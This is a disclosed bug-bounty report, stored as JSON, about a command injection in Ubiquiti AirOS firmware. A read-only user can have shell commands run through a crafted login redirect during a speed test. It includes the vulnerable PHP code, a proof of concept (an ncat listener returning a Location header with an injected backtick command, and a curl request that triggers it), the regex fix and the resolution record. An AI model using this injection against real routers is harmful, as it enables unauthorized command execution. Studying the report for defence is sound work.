{"id":139398,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzkzOTg=","url":"https://hackerone.com/reports/139398","title":"Read-Only user can execute arbitraty shell commands on AirOS","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-05-17T17:47:16.026Z","submitted_at":"2016-05-17T17:47:16.026Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"93c08539","url":"/93c08539","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/033/613/8c3e2d95cf9be1554d0d1e8de292b45c73325047_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":800,"url":"https://hackerone.com/ui","handle":"ui","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/800/449ca06f77c3e1dd1979bae1e5f16150334f7479_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/800/449ca06f77c3e1dd1979bae1e5f16150334f7479_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Ubiquiti Inc.","twitter_handle":"ubnt","website":"https://ui.com","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-08-05T09:36:57.491Z","bug_reporter_agreed_on_going_public_at":"2016-07-06T09:36:38.871Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"This vulnerability is very similar to #128750, but it avoid the solution applied to the last beta XM firmware.\n\nIn this report is used the last beta XM firmware: `XM.v6.0-beta9`\n\n# Vulnerability\nThe vulnerability resides in the function `fetchCookies` file `remote.inc:117`. Just like last time is a non sanitization or verification of the server (remote) response.\n\n```\n\t\tif ($res == -11) { #received the redirect\n\t\t\t# got redirect, will have to try new one (if that's login.cgi)\n\t\t\t$lcount = count($lines);\n\t\t\tif ($lcount \u003e 0) {\n\t\t\t\t$new_url = $lines[$lcount - 1]; # the URL returned by the attacker have shell code injected\n\t\t\t}\n\t\t\t$rg_login = \"(https?://$ip(:[[:digit:]]+)?)/login.cgi\"; #regex don't property verify the URL, it allow string before and after the URL\n\t\t\tif (IsSet($new_url) \u0026\u0026 ereg($rg_login, $new_url, $regs)) {\n\t\t\t\t$retry = 1;\n\t\t\t\t$base_url = $regs[1];\n\t\t\t\t$url = $new_url; # URL with shell code is utilized\n\t\t\t}\n\t\t}\n\t\t#[[REMOVED CODE]]\n\n\t\tif ($retry != 0) {\n\t\t\t$full_cmd = \"$cmd_trigger -p $url\"; # URL with shell code is injected\n\t\t\texec($full_cmd, $lines, $res); # shell code executed\n\t\t\t$res = getRetVal($res);\n\t\t}\n\n\t\t}\n```\n\n# Proof-of-concept\nFirst we (attacker) need to initialize a local server to make the redirect to the victim, in this example the attacker ip is `192.168.1.100`:\n```\necho -en \"HTTP/1.1 302 Found\\r\\nLocation: https://192.168.1.100/login.cgi `reboot`\\r\\nContent-Length: 0\\r\\n\\r\\n\" | ncat -lp 8080\n```\n\nSo you need to run a speed test against the attacker host, with can be done using the Web interface `https://192.168.1.20/sptest.cgi`, or by the following command (making the required adjusts):\n```\ncurl 'https://192.168.1.20/sptest_action.cgi?ticket=507\u0026action=remote\u0026target=192.168.1.100\u0026port=8080\u0026login=ignore\u0026passwd=ignore\u0026airosid=96ba18a3aa55ba4c6e1f8ab111a9fb8f\u0026_=1463505340471' -H 'Cookie: AIROS_001122334455=96ba18a3aa55ba4c6e1f8ab111a9fb8f; ui_language=en_US; last_check=1463504970136' \n```\n\n# Possible Solution\nThis bug can be solved using literally 2 character, the REGEX end `$` and begin `^`:\n```\n$rg_login = \"^(https?://$ip(:[[:digit:]]+)?)/login.cgi$\";\n```","vulnerability_information_html":"\u003cp\u003eThis vulnerability is very similar to \u003ca href=\"/reports/128750\"\u003e#128750\u003c/a\u003e, but it avoid the solution applied to the last beta XM firmware.\u003c/p\u003e\n\n\u003cp\u003eIn this report is used the last beta XM firmware: \u003ccode\u003eXM.v6.0-beta9\u003c/code\u003e\u003c/p\u003e\n\n\u003ch1 id=\"vulnerability\"\u003eVulnerability\u003c/h1\u003e\n\n\u003cp\u003eThe vulnerability resides in the function \u003ccode\u003efetchCookies\u003c/code\u003e file \u003ccode\u003eremote.inc:117\u003c/code\u003e. Just like last time is a non sanitization or verification of the server (remote) response.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e        if ($res == -11) { #received the redirect\n            # got redirect, will have to try new one (if that\u0026#39;s login.cgi)\n            $lcount = count($lines);\n            if ($lcount \u0026gt; 0) {\n                $new_url = $lines[$lcount - 1]; # the URL returned by the attacker have shell code injected\n            }\n            $rg_login = \u0026quot;(https?://$ip(:[[:digit:]]+)?)/login.cgi\u0026quot;; #regex don\u0026#39;t property verify the URL, it allow string before and after the URL\n            if (IsSet($new_url) \u0026amp;\u0026amp; ereg($rg_login, $new_url, $regs)) {\n                $retry = 1;\n                $base_url = $regs[1];\n                $url = $new_url; # URL with shell code is utilized\n            }\n        }\n        #[[REMOVED CODE]]\n\n        if ($retry != 0) {\n            $full_cmd = \u0026quot;$cmd_trigger -p $url\u0026quot;; # URL with shell code is injected\n            exec($full_cmd, $lines, $res); # shell code executed\n            $res = getRetVal($res);\n        }\n\n        }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"proof-of-concept\"\u003eProof-of-concept\u003c/h1\u003e\n\n\u003cp\u003eFirst we (attacker) need to initialize a local server to make the redirect to the victim, in this example the attacker ip is \u003ccode\u003e192.168.1.100\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eecho -en \u0026quot;HTTP/1.1 302 Found\\r\\nLocation: https://192.168.1.100/login.cgi `reboot`\\r\\nContent-Length: 0\\r\\n\\r\\n\u0026quot; | ncat -lp 8080\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSo you need to run a speed test against the attacker host, with can be done using the Web interface \u003ccode\u003ehttps://192.168.1.20/sptest.cgi\u003c/code\u003e, or by the following command (making the required adjusts):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl \u0026#39;https://192.168.1.20/sptest_action.cgi?ticket=507\u0026amp;action=remote\u0026amp;target=192.168.1.100\u0026amp;port=8080\u0026amp;login=ignore\u0026amp;passwd=ignore\u0026amp;airosid=96ba18a3aa55ba4c6e1f8ab111a9fb8f\u0026amp;_=1463505340471\u0026#39; -H \u0026#39;Cookie: AIROS_001122334455=96ba18a3aa55ba4c6e1f8ab111a9fb8f; ui_language=en_US; last_check=1463504970136\u0026#39; \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"possible-solution\"\u003ePossible Solution\u003c/h1\u003e\n\n\u003cp\u003eThis bug can be solved using literally 2 character, the REGEX end \u003ccode\u003e$\u003c/code\u003e and begin \u003ccode\u003e^\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$rg_login = \u0026quot;^(https?://$ip(:[[:digit:]]+)?)/login.cgi$\u0026quot;;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","bounty_amount":"2750.0","formatted_bounty":"$2,750","weakness":{"id":58,"name":"Command Injection - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-08-05T09:36:39.031Z","allow_singular_disclosure_after":-138826260.94222862,"singular_disclosure_allowed":true,"vote_count":43,"voters":["93c08539","zoom7","hunter","zseano","ebrietas","jahrek","ngalog","secconsult","abdoubhc","supernatural","and 33 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":961789,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2016-05-17T17:54:05.718Z","updated_at":"2016-05-17T17:54:05.718Z","actor":{"username":"ubnt-james","cleared":false,"url":"/ubnt-james","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ui","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":985520,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Fixed in `airOS 5.6.6`.","markdown_message":"\u003cp\u003eFixed in \u003ccode\u003eairOS 5.6.6\u003c/code\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-26T17:33:56.562Z","updated_at":"2016-05-26T17:33:56.562Z","actor":{"username":"93c08539","cleared":false,"url":"/93c08539","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/033/613/8c3e2d95cf9be1554d0d1e8de292b45c73325047_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ui","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":987128,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Fixed in `v8.0-beta13`.","markdown_message":"\u003cp\u003eFixed in \u003ccode\u003ev8.0-beta13\u003c/code\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-27T13:53:14.975Z","updated_at":"2016-05-27T13:55:02.121Z","actor":{"username":"93c08539","cleared":false,"url":"/93c08539","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/033/613/8c3e2d95cf9be1554d0d1e8de292b45c73325047_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ui","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":987359,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi There,\n\nIf you have a moment, could you review 7.2.2 which was released today and confirm?  It contains the same patch.\n\nhttps://www.ubnt.com/download/airmax-ac/nanobeam-ac\n\n","markdown_message":"\u003cp\u003eHi There,\u003c/p\u003e\n\n\u003cp\u003eIf you have a moment, could you review 7.2.2 which was released today and confirm?  It contains the same patch.\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://www.ubnt.com/download/airmax-ac/nanobeam-ac\" href=\"/redirect?url=https%3A%2F%2Fwww.ubnt.com%2Fdownload%2Fairmax-ac%2Fnanobeam-ac\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.ubnt.com/download/airmax-ac/nanobeam-ac\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-27T15:32:13.503Z","updated_at":"2016-05-27T15:32:13.503Z","actor":{"username":"ubnt-james","cleared":false,"url":"/ubnt-james","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ui","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":987461,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Fixed in `v7.2.2`.","markdown_message":"\u003cp\u003eFixed in \u003ccode\u003ev7.2.2\u003c/code\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-27T16:02:52.589Z","updated_at":"2016-05-27T16:02:52.589Z","actor":{"username":"93c08539","cleared":false,"url":"/93c08539","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/033/613/8c3e2d95cf9be1554d0d1e8de292b45c73325047_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ui","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":989772,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The last stable firmware solves this bug. This report can be marked as solved, and assigned a reward maybe? :)","markdown_message":"\u003cp\u003eThe last stable firmware solves this bug. This report can be marked as solved, and assigned a reward maybe? :)\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-29T12:33:11.020Z","updated_at":"2016-05-29T12:33:11.020Z","actor":{"username":"93c08539","cleared":false,"url":"/93c08539","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/033/613/8c3e2d95cf9be1554d0d1e8de292b45c73325047_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ui","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1004990,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2016-06-08T17:55:26.362Z","updated_at":"2016-06-08T17:55:26.362Z","actor":{"url":"/ui","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/800/449ca06f77c3e1dd1979bae1e5f16150334f7479_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Ubiquiti Inc."}},"bounty_amount":"2750.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"ui","collaborator":{"username":"93c08539","url":"/93c08539"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1004991,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2016-06-08T17:55:45.769Z","updated_at":"2016-06-08T17:55:45.769Z","actor":{"username":"ubnt-james","cleared":false,"url":"/ubnt-james","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"93c08539","url":"/93c08539"},"genius_execution_id":null,"team_handle":"ui","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1055269,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Fixed in the last stable version","markdown_message":"\u003cp\u003eFixed in the last stable version\u003c/p\u003e\n","automated_response":false,"created_at":"2016-07-06T09:36:38.905Z","updated_at":"2016-07-06T09:36:38.905Z","first_to_agree":true,"actor":{"username":"93c08539","cleared":false,"url":"/93c08539","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/033/613/8c3e2d95cf9be1554d0d1e8de292b45c73325047_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ui","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1107860,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-08-05T09:36:57.612Z","updated_at":"2016-08-05T09:36:57.612Z","actor":{"url":"/ui","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/800/449ca06f77c3e1dd1979bae1e5f16150334f7479_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Ubiquiti Inc."}},"genius_execution_id":null,"team_handle":"ui","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":2295,"category":"researcher","content":"This report is the third of a series of three: #119317, #128750 and #139398. \nThe researcher demonstrates how a read-only user can execute shell commands on a AirOS router, bypassing the solution to #128750 and consequently #119317.\nThree reports in a row makes a \"combo\" :)","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eThis report is the third of a series of three: \u003ca href=\"/reports/119317\"\u003e#119317\u003c/a\u003e, \u003ca href=\"/reports/128750\"\u003e#128750\u003c/a\u003e and \u003ca href=\"/reports/139398\"\u003e#139398\u003c/a\u003e. \u003cbr\u003e\nThe researcher demonstrates how a read-only user can execute shell commands on a AirOS router, bypassing the solution to \u003ca href=\"/reports/128750\"\u003e#128750\u003c/a\u003e and consequently \u003ca href=\"/reports/119317\"\u003e#119317\u003c/a\u003e.\u003cbr\u003e\nThree reports in a row makes a \u0026quot;combo\u0026quot; :)\u003c/p\u003e\n"}]}